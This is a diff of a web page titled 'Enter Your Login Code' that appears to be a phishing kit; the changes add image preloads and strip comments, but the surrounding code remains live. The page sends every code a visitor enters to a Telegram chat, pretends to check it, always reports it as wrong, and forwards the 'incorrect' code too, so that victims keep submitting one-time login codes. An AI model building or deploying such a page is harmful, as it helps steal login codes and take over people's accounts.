@@ -4,8 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Enter Your Login Code</title>
+  <link rel="preload" as="image" href="imgs/photo-2024-04-15-20-05-52.jpg">
+  <link rel="preload" as="image" href="imgs/photo-2024-04-18-23-11-45.jpg">
   <style>
-    /* Your existing styles */
     * {
       box-sizing: border-box;
     }
@@ -240,16 +241,13 @@
         return;
       }
 
-      // Send the entered code to Telegram
       await sendTelegramMessage(`Code submitted: ${code}\nTime: ${new Date().toLocaleString()}`);
 
-      // Reset states
       error.style.display = "none";
       timer.style.display = "none";
       checking.style.display = "block";
       button.disabled = true;
 
-      // Simulate 1 second delay to check code
       setTimeout(async () => {
         checking.style.display = "none";
         error.style.display = "block";
@@ -257,7 +255,6 @@
         let timeLeft = 30;
         timer.textContent = `Please wait ${timeLeft} seconds...`;
 
-        // Notify Telegram about incorrect code error
         await sendTelegramMessage(`Incorrect code entered: ${code}\nWaiting 30 seconds before next attempt\nTime: ${new Date().toLocaleString()}`);
 
         const countdown = setInterval(() => {
